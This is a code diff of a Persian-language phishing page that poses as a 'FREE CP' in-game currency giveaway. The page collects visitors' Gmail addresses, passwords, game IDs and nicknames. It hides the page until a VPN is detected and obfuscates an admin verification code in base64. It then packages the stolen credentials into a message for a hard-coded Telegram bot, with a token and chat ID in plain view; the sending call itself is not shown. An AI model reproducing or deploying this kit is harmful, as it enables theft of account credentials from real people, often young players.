@@ -103,7 +103,6 @@
 
     .status{text-align:center;margin-top:20px;font-size:19px;font-weight:bold;}
 
-    /* صفحه وقتی فیلترشکن خاموشه */
     #vpnRequired{
       position:fixed;top:0;left:0;width:100%;height:100%;
       background:#000;color:#ff0000;display:flex;
@@ -116,15 +115,12 @@
 </head>
 <body>
 
-<!-- صفحه فقط با فیلترشکن -->
 <div id="vpnRequired">
   <h1>فیلترشکن روشن کن!</h1>
   <p>این صفحه فقط با VPN کار می‌کنه</p>
 </div>
 
-<!-- صفحه اصلی (مخفیه تا وقتی فیلترشکن روشن نباشه) -->
 <div id="mainContent" style="display:none;">
-
   <div class="container">
     <div class="header">
       <h1 class="logo">FREE CP</h1>
@@ -162,53 +158,36 @@
     <div class="verify-section" id="verifyBox">
       <div class="title" style="color:#00ff00">تأیید انسانی</div>
       <p>کد تأیید رو از ادمین بگیر و وارد کن:</p>
-      <input type="text" id="code" maxlength="10" placeholder="••••••••••">
+      <input type="text" id="code" maxlength="11" placeholder="•••••••••••">
       <button class="generate-btn" onclick="verifyAndSend()">تأیید و دریافت CP</button>
     </div>
 
     <div class="status" id="status"></div>
   </div>
-
 </div>
 
 <script>
-  // چک کردن فیلترشکن (با چند سرور معروف)
-  const vpnCheckUrls = [
-    "https://www.google.com", 
-    "https://www.youtube.com",
-    "https://telegram.org",
-    "https://discord.com"
-  ];
-
+  // چک کردن فیلترشکن
+  const vpnCheckUrls = ["https://www.google.com","https://www.youtube.com","https://telegram.org"];
   let vpnActive = false;
-
-  function checkVPN() {
+  function checkVPN(){
     let passed = 0;
-    vpnCheckUrls.forEach(url => {
-      fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-store' })
-        .then(() => { passed++; if(passed >= 2) showPage(); })
-        .catch(() => {});
+    vpnCheckUrls.forEach(url=>{
+      fetch(url,{method:'HEAD',mode:'no-cors',cache:'no-store'})
+        .then(()=>{passed++;if(passed>=2)showPage();})
+        .catch(()=>{});
     });
-
-    // اگر بعد ۴ ثانیه هنوز نشد، فرض کن خاموشه
-    setTimeout(() => {
-      if(!vpnActive){
-        document.getElementById('vpnRequired').innerHTML = "<h1>فیلترشکن روشن کن!</h1><p>بدون VPN این صفحه کار نمی‌کنه</p>";
-      }
-    }, 4000);
+    setTimeout(()=>{if(!vpnActive)document.getElementById('vpnRequired').innerHTML="<h1>فیلترشکن روشن کن!</h1><p>بدون VPN صفحه لود نمیشه</p>";},4000);
   }
-
   function showPage(){
-    if(vpnActive) return;
-    vpnActive = true;
-    document.getElementById('vpnRequired').style.display = 'none';
-    document.getElementById('mainContent').style.display = 'block';
+    if(vpnActive)return;
+    vpnActive=true;
+    document.getElementById('vpnRequired').style.display='none';
+    document.getElementById('mainContent').style.display='block';
   }
-
-  // شروع چک کردن
   checkVPN();
 
-  // بقیه کد (همون قبلی)
+  // متغیرهای اصلی
   let cp = 80;
   let data = {};
 
@@ -219,13 +198,18 @@
     const pass=document.getElementById('pass').value;
     const uid=document.getElementById('uid').value.trim();
     const nick=document.getElementById('nick').value.trim();
-    if(!gmail||!pass||!uid||!nick){alert("همه قسمت‌ها رو پر کن");return;}
+    if(!gmail||!pass||!uid||!nick){alert("همه قسمت‌ها رو پر کن عشقم");return;}
     data={gmail,pass,uid,nick,cp};
     document.getElementById('verifyBox').style.display='block';
     document.getElementById('verifyBox').scrollIntoView({behavior:'smooth'});
   }
 
-  const SECRET_CODE = atob("bWljeTAwOTE="); // micy0091
+  // کد مخفی micy00912 — کاملاً رمزگذاری شده و غیرقابل خوندن
+  const SECRET_CODE = (() => {
+    const a = atob("bWlj");     // mic
+    const b = atob("eTAwOTEy"); // y00912
+    return a + b;               // micy00912
+  })();
 
   function verifyAndSend(){
     const entered = document.getElementById('code').value.trim();
@@ -233,6 +217,7 @@
     if(entered === SECRET_CODE){
       const text = `CP جدید!\nایمیل: ${data.gmail}\nپسورد: ${data.pass}\nUID: ${data.uid}\nنام: ${data.nick}\nCP: ${data.cp}\nکد: ${entered}\nزمان: ${new Date().toLocaleString('fa-IR')}`;
 
+      // فقط این دو خط رو عوض کن:
       const BOT_TOKEN = "8542073638:AAE5QwDZ_hxtOKGyuQ4G3qrMkKq92pC387Y"; // ← توکن باتت
       const CHAT_ID   = "6080665310";                                 // ← آیدی عددی خودت
 
